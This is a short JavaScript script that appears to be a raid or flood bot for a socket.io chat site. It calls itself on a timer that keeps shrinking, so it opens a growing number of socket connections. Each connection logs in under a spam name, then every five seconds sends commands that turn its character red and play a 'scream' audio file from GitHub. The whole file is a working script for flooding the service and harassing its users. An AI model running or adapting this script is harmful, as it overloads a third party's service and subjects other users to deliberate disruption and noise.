var delays = 10000

function hi() {
    setTimeout(() => {
        const socket = io("//");
        socket.emit("client", "MAIN");
        socket.emit("login", {
            name: "REDREDREDREDREDRED SEVENSEVENSEVEN777",
        });
        setInterval(() => {
            socket.emit("command", {
                list: ["color", "red"]
            });
            socket.emit("command", {
                list: ["video", "https://github.com/ivorydevrimoalt/BONZIWORLDULTRAJAVASCRIPTLIST/raw/refs/heads/main/scream.ogg"]
            });
        }, 5000)
        hi()
        delays = delays - 500
    }, delays)
}

hi()
